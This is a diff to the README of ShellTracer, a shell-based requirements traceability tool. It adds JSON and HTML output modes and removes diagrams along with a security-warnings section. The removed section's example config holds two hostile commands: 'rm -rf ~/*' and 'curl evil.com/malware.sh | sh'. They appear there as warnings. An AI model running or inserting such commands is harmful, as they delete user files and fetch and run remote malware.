@@ -13,57 +13,11 @@ ShellTracer (**shtracer**) is a project for creating a [requirements traceabilit
 * For maximum extensibility and easy version control, simplify the input/output files as text files.
 * For portability, use only shell scripts to create RTMs.
 
-```mermaid
-stateDiagram
-
-input:Input
-opt_input:Optional input files
-
-state input {
-  targetfiles:Trace target files
-  config:config.md
-}
-state opt_input {
-  wordinput:Word files
-  excelinput:Excel files
-}
-note left of input
-  Text files
-end note
-
-[*] --> input
-[*] --> opt_input
-
-opt_input --> targetfiles : pre-extra-scripts
-opt_output:Optional output files
-
-state output {
-  txt_output: Text files
-  html_output:HTML file
-}
-
-state txt_output {
-  rtm:Requirements traceability matrix (RTM)
-  uml:UML
-}
-
-state opt_output {
-  excel_output:Excel file
-}
-
-
-input --> output : shtracer
-rtm --> opt_output : post-extra-scripts
-rtm --> html_output
-uml --> html_output
-
-```
-
 ## 📷 Screenshots
 
 ### HTML output
 
-![sample](./docs/img/sample.png)
+![](./docs/img/flow.png)
 
 ### Text output
 
@@ -75,38 +29,6 @@ uml --> html_output
 @REQ1.4@ @ARC2.1@ @IMP2.1@ @UT2.1@ @IT1.1@
 ```
 
-### UML
-
-* Drawn by Mermaid.
-
-```mermaid
-flowchart TB
-
-start[Start]
-id1([Requirement])
-id2([Architecture])
-id3_1_1([Implementation])
-id3_1_2([Unit test])
-id3_2_1([Implementation])
-id3_2_2([Unit test])
-id4([Integration test])
-stop[End]
-
-start --> id1
-id1 --> id2
-id2 --> id3_1_1
-subgraph "Main scripts"
-id3_1_1 --> id3_1_2
-end
-id2 --> id3_2_1
-subgraph "Optional scripts"
-id3_2_1 --> id3_2_2
-end
-id3_1_2 --> id4
-id3_2_2 --> id4
-id4 --> stop
-```
-
 ## 🥅 Goal
 
 * Make the requirements traceability matrix (RTM) through markdown formatted text files.
@@ -114,7 +36,7 @@ id4 --> stop
 
 ## ⚽ Getting started
 
-1. Open bash.
+1. Open shell.
 1. Set the current directory at this repository.
 1. Enter the following commands.
 
@@ -122,8 +44,17 @@ id4 --> stop
 # Change mode
 chmod +x ./shtracer
 
-# Read a configuration file and create a traceability matrix
+# Optional viewer
+chmod +x ./scripts/main/shtracer_viewer.sh
+
+# Read a configuration file and create traceability artifacts (tag table + JSON)
 ./shtracer ./sample/config.md
+
+# Create a single self-contained HTML report (stdin JSON -> stdout HTML)
+./shtracer --json ./sample/config.md | ./scripts/main/shtracer_viewer.sh > ./sample/output/output.html
+
+# Or, generate HTML directly (JSON -> viewer internally)
+./shtracer --html ./sample/config.md > ./sample/output/output.html
 ```
 
 ## 🚀 Usage
@@ -132,26 +63,36 @@ chmod +x ./shtracer
 Usage: shtracer <configfile> [options]
 
 Options:
-  -c <before_tag> <after_tag>      Change mode: swap or rename trace target tags
+  -c <old_tag> <new_tag>           Change mode: swap or rename trace target tags
   -v                               Verify mode: detect duplicate or isolated tags
   -t                               Test mode: execute unit tests
+  --json                           Export traceability data in JSON format (stdout)
+  --html                           Export a single HTML document to stdout
+  --summary                        Print traceability summary to stdout (direct links only)
   -h, --help                       Show this help message
 
 Examples:
   1. Normal mode
      $ ./shtracer ./sample/config.md
 
-  2. Change mode (swap or rename tags).
-     $ ./shtracer ./sample/config.md -c old_tag new_tag.
+  2. Generate HTML via viewer (recommended)
+     $ ./shtracer --json ./sample/config.md | ./scripts/main/shtracer_viewer.sh > ./sample/output/output.html
 
-  3. Verify mode (check for duplicate or isolated tags).
-     $ ./shtracer ./sample/config.md -v
+  3. Generate HTML directly
+     $ ./shtracer --html ./sample/config.md > ./sample/output/output.html
 
-  4. Test mode
+  4. Change mode (swap or rename tags)
+     $ ./shtracer -c old_tag new_tag ./sample/config.md
+
+  5. Verify mode (check for duplicate or isolated tags)
+     $ ./shtracer -v ./sample/config.md
+
+  6. Test mode
      $ ./shtracer -t
 
 Note:
-  - The <configfile> argument must always be specified before options.
+  - Arguments can be specified in any order.
+  - Only one option can be used at a time.
 
 ```
 
@@ -200,16 +141,20 @@ Note:
 
 ## 🗂️ Features
 
-* Create traceability markdown files from following input files.
-  * Markdown files which include contents to trace.
-  * These contents are indexed by their own IDs.
-  * Connections between files are specified by IDs.
-  * These IDs are written in each markdown file as comment blocks.
-* (Optional) Use markdown files as intermediate products.
-  * Create intermediate markdown files from other file format by using some scripts.
-  * Create non-markdown output files by using some scripts.
+### Core Traceability
 
-For details, see documents in `./docs/` directory.
+* **Tag-Based Linking**: Connect requirements, architecture, implementation, and tests using simple `@TAG@` syntax in markdown comments
+* **Multi-File Tracing**: Trace across multiple markdown files and source code files
+* **Verification Mode**: Validate that all tags are properly linked (no orphaned or broken references)
+* **Change Mode**: Safely rename/swap tags across your entire project
+
+### Developer-Friendly
+
+* **JSON-First Output**: Structured JSON output via `--json` for integration with other tools
+* **Cross-Platform**: POSIX-compliant shell scripts work on Linux, macOS, and Windows (via Git Bash/WSL)
+* **Security-Focused**: Removed arbitrary script execution (PRE/POST-EXTRA-SCRIPT) in v0.2.0
+
+For detailed usage and examples, see documents in `./docs/` directory.
 
 ## 🌏 Requirements
 
@@ -227,7 +172,7 @@ For details, see documents in `./docs/` directory.
 
 * [shUnit2](https://github.com/kward/shunit2) (for unit testing)
 * [highlight.js](https://highlightjs.org/) (for syntax highlighting)
-* [mermaid.js](https://mermaid.js.org/) (for showing UMLs)
+* [d3.js](https://d3js.org/) (for showing diagrams)
 
 ## 🔧 Development Setup
 
@@ -242,52 +187,19 @@ Install the following tools for local development (optional but recommended):
 sudo apt-get install shellcheck  # Debian/Ubuntu
 brew install shellcheck          # macOS
 
-# Install shfmt
-go install mvdan.cc/sh/v3/cmd/shfmt@latest
-# or download from https://github.com/mvdan/sh/releases
+# Install shfmt v3.8.0 (CI uses this version)
+# Install system-wide (recommended)
+# go install mvdan.cc/sh/v3/cmd/shfmt@v3.8.0
+# or download from https://github.com/mvdan/sh/releases/tag/v3.8.0
 ```
+
+**Note**: Use shfmt v3.8.0 to match CI formatting checks and avoid false formatting issues.
 
 ### Git Hooks
 
 Optional pre-commit hooks are available to automatically check code quality (shellcheck, shfmt) before commits. These hooks are optional for local development as all checks are also enforced in CI.
 
 For installation and usage, see [.git-hooks/README.md](.git-hooks/README.md).
-
-## ⚠️ Security Considerations
-
-**IMPORTANT: Only use trusted configuration files.**
-
-shtracer executes shell commands specified in configuration files through the following features:
-
-* **PRE-EXTRA-SCRIPT**: Arbitrary shell commands executed before processing
-* **POST-EXTRA-SCRIPT**: Arbitrary shell commands executed after processing
-
-### Security Risks
-
-1. **Arbitrary Code Execution**: Malicious configuration files can execute any shell command with your user permissions
-2. **File System Access**: Scripts can read, modify, or delete files accessible to your user account
-3. **Network Access**: Scripts can make network connections or download additional malicious code
-
-### Best Practices
-
-* ✅ **Only use configuration files from trusted sources**
-* ✅ **Review PRE-EXTRA-SCRIPT and POST-EXTRA-SCRIPT contents before execution**
-* ✅ **Avoid running shtracer with elevated privileges (sudo)**
-* ✅ **Use version control to track configuration file changes**
-* ❌ **Never execute configuration files from untrusted or unknown sources**
-
-### Example of Potentially Dangerous Configuration
-
-```markdown
-* **PRE-EXTRA-SCRIPT**: `rm -rf ~/*`  <!-- ⚠️ DANGEROUS: Deletes all user files -->
-* **POST-EXTRA-SCRIPT**: `curl evil.com/malware.sh | sh`  <!-- ⚠️ DANGEROUS: Downloads and executes remote code -->
-```
-
-**For security-sensitive environments, consider:**
-
-* Auditing all configuration files before use
-* Running shtracer in a sandboxed environment (containers, VMs)
-* Implementing organization-specific configuration file approval processes
 
 ## 📝 Contribution
 
@@ -298,12 +210,11 @@ shtracer executes shell commands specified in configuration files through the fo
 
 ### High Priority
 
-* Improve HTML output styling: Apply nice colorschemes that are colorblind-friendly
 * Make a cross-reference table for easy reference
-* Export all trace data in Markdown format.
+* Export all trace data in Markdown format
 
 ### Future Enhancements
 
 * Use OR condition in the extension filter
-* Use custom CSS files for HTML output
 * Support Excel/CSV export formats
+* Add colorblind-friendly color palette option
